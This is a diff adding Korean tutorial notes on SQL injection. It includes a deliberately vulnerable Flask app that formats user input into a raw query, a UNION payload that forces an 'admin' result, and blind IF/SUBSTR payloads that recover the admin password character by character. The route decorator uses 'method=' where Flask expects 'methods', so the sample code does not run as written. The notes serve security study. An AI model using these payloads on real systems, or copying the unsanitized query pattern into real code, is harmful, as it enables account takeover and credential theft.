@@ -212,3 +212,82 @@ WHERE 절에서 서브 쿼리를 사용하면 다중 행(Multiple Row) 결과를
     # users 테이블에서 username이 "admin", "guest"인 행을 검색함
     SELECT * FROM users WHERE username IN (SELECT "admin" UNION SELECT "guest");
     ```
+
+<br/>
+
+### UNION, Subquery를 이용한 SQL Injection 공격 예시
+```python
+from flask import Flask, request
+import pymysql
+
+app = Flask(__name__)
+
+def getConnection():
+	return pymysql.connect(host='localhost', user='dream', password='hack', db='dreamhack', charset='utf8')
+
+@app.route('/', method=['GET'])
+def index():
+	username = request.args.get('username') # 이용자가 인자로 전달한 username을 가져옴
+	sql = "select username from users where username='%s'" %username # username을 별다른 검증 없이 쿼리에 사용함 (Raw Query → SQL Injection이 발생함)
+
+	conn = getConnection()
+	curs = conn.cursor(pymysql.cursors.DictCursor)
+	curs.execute(sql)
+	rows = curs.fetchall()
+	conn.close()
+
+    # 쿼리의 결과로 username이 "admin"일 경우 참을, 아닐 경우 겂을 반환함 (참/거짓을 구분하여 공격을 수행해야 함)
+	if (rows[0]['username'] == 'admin'):
+		return "True"
+	else:
+		return "False"
+
+app.run(host='0.0.0.0', port=8000)
+```
+* users 데이터베이스의 구성
+    | username | password |
+    |---|---|
+    | admin | Password_for_admin |
+    | guest | guest_Password |
+
+#### *UNION을 사용한 공격: username을 admin으로 만들어 true를 반환시키게 만듦(admin 계정으로 로그인함)*
+UNION 절을 사용하면 두 개의 SELECT 구문의 결과를 반환하므로 참을 반환할 수 있음
+* 공격 코드
+    - username 인자값: ```' UNION SELECT 'admin' -- -`
+    - 생성되는 SQL Query
+        ```sql
+        SELECT username FROM users WHERE username='' UNION SELECT 'admin' -- -
+        # UNION 절에서 "admin"을 반환하므로 애플리케이션에셔 True를 반환하게 됨
+        ```
+        + 첫 번째 SELECT 문의 결과로 아무것도 반환하지 않지만, 두 번째 SELECT 문의 결과로 'admin'을 반환함 → 이 두 SELECT 문을 UNION한 결과 'admin'이 반환됨
+
+#### *Subquery를 사용한 공격: admin 계정의 비밀번호를 알아냄*
+SQL의 IF문을 사용해 비교 구문을 만들어서 관리자 계정의 비밀반호를 한 글자씩 알아낼 수 있음
+* 공격코드 형식
+    - username 인자값: ```' UNION SELECT IF(SUBSTR(password, start, 1)='알파벳', 'admin', 'not admin') FROM users WHERE username='admin'-- -```
+    - 생성되는 비교 구문의 형식
+        ```sql
+        SELECT username FROM users WHERE username=''
+        UNION
+        SELECT IF(SUBSTR(password, start, len)='알파벳', 'admin', 'not admin') FROM users WHERE username='admin'
+        # start: 시작 위치, len: 길이(한 자리씩 비교하므로 1), '알파벳': 'a', 'b'와 같이 해당 위치의 알파벳과 비교할 알파벳 명시 (비교 결과 일치하면 'admin'을, 일치하지 않으면 'not admin'을 반환함)
+        ```
+* SQL의 IF 조건문과 SUBSTR 함수
+    - MySQL의 IF 조건문의 기본 형식
+        ```sql
+        IF (조건문, 참일때 값, 거짓일 때 값)
+        SELECT IF(required, '필수', '선택') AS '필수 여부' FROM TABLE
+        ```
+    - SUBSTR 함수: 문자열 중 특정 위치에서 시작하여 지정한 길이만큼 문자열을 반환하는 함수
+        ```sql
+        SUBSTR(문자열, 시작위치, 길이)
+        ```
+        + 시작 위치와 길이를 입력하여 필요한 데이터를 가져오는데 사용함
+* 공격 코드
+    - 알파벳과 시작 위치(start)를 변경시켜가며 한 바이트씩 비밀번호를 알아냄
+        |  | username 입력값 | 결과 |
+        |---|--------|---|
+        | 1 | ```' UNION SELECT IF(SUBSTR(password, 1, 1)='B', 'admin', 'not admin') FROM users WHERE username='admin'-- -``` | False |
+        | 2 | ```' UNION SELECT IF(SUBSTR(password, 1, 1)='P', 'admin', 'not admin') FROM users WHERE username='admin'-- -``` | True |
+        | 3 | ```' UNION SELECT IF(SUBSTR(password, 2, 1)='a', 'admin', 'not admin') FROM users WHERE username='admin'-- -``` | True |
+        | 4 | ... | ... |
